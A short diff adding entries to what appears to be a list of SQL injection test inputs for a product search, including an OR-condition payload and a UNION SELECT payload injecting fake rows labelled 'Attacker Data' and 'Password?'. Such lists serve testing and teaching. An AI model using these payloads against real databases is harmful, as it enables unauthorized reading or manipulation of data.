@@ -47,3 +47,7 @@ Laptop"/*
 ' OR name LIKE 'Incredible%' --
 
 ' OR name LIKE '%Toys%' --
+
+' UNION SELECT 1, 'Attacker Data', 'Password?', 0.0 --
+
+' OR id IN (12, 24) --
